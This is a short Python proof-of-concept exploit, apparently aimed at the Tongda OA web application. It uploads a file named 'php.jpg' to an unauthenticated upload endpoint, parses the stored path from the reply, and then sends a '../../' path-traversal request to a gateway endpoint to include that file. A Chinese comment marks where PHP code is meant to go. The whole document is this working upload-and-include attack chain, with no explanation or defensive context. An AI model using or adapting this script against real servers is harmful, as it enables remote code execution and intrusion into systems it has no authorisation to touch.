import requests
upload_url = "http://127.0.0.1/ispirit/im/upload.php"
include_url = "http://127.0.0.1/ispirit/interface/gateway.php"
files = {'ATTACHMENT':"12123"}#这里写php
upload_data={"P":"123","Filename":"php.jpg","DEST_UID":"1","UPLOAS_MODE":"2"}
upload_res = requests.post(upload_url,upload_data,files=files)
path = upload_res.text
path = path[path.find('@')+1:path.rfind('|')].replace("_","\/").replace("|",".")
include_data = {"json":"{\"url\":\"/general/../../attach/im/" +path+"\"}"}
include_res = requests.post(include_url,data=include_data)
print(include_res.text)